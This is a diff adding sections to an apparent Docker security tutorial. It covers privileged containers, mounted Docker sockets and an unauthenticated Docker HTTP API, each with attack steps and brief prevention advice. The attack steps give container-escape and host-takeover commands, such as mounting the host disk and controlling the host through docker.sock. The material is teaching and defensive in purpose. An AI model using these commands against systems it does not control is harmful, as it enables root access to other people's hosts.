@@ -37,3 +37,60 @@ Example : We can run a DOS(Denial of service) attack once we have full access(ro
  4. Run the docker container - `docker run --rm -it ubuntu:test`. Here `whoami` will give `john`
  5. With this continer you cannot install any new libraries. Test with `apt-get intall stress` which gives `Permission denied` error
  6. You cannot be a root with such images which makes your containers secure
+
+## Privileged Mode
+   Do not run the containers in privilage mode. It gives full access to the host machine.
+
+#### Attack
+1. Run `docker run --privileged -it --rm ubuntu sh`
+2. As the continer is running in privileged mode. It disables all the security measures.
+3. Run command `mount` which gives all the mount points
+4. Now you can mount any of these mounts from the host system
+5. Run `mkdir /hostroot && mount /dev/vda1 hostroot`
+6. This mount the host machines data to your container
+
+#### Prevention
+1. Avoid running the containers in privilage mode
+
+
+## Socket Misconfigurations
+Sometimes people just mount the docker socket inside the container. If an attacker gains access to this container, he literally has root access.
+
+#### Attack
+1. Mount socket `docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest sh`
+2. Run `apt-get update ; apt-get install docker.io -y` to install docker client
+3. `docker --version` to check if docker is running
+4. `docker run -it --rm centos sh`
+5. With this you can run containers in host machine
+6. As we can its very dangerous to mount the docker socket inside any container. The centos container can do anything that the host system can do as root.
+
+
+#### Prevention
+1. Try to avoid docker socket. 
+
+## Misconfig in Docker HTTP REST API
+By default unix uses docker socket. You can expose it via HTTP as well. People do not care security of this HTTP REST API.
+
+#### Attack
+1. Expose docker via REST API
+2. `sudo cp /lib/systemd/system/docker.service /etc/systemd/system/`
+3. `sudo vi /etc/systemd/system/docker.service`
+4. Add `-H tcp://0.0.0.0:2376` at the end of ExecStart
+5. `sudo systemctl daemon-reload` reload new config
+6. `sudo systemctl restart docker.service` restart docker
+7. `curl http://localhost:2376/version` -> gives the docker version
+8. `sudo apt-get install jq -y` this is a json formatter
+9. `docker run --rm -it -d ubunut` run an ubuntu instance
+10. `http://localhost:2376/containers/json | jq` gives list of containers(similar to `docker ps`)
+11. Stop container `http://localhost:2376/containers/<container-name>/stop`
+12. Here the API is unauthenticaed
+13. API is Non-SSL
+
+This gives attacer a clear access.
+
+#### Prevention
+1. Run an apache2 or nginx as a proxy
+2. Configure SSL, Authentication in nginx/apache2
+
+
+
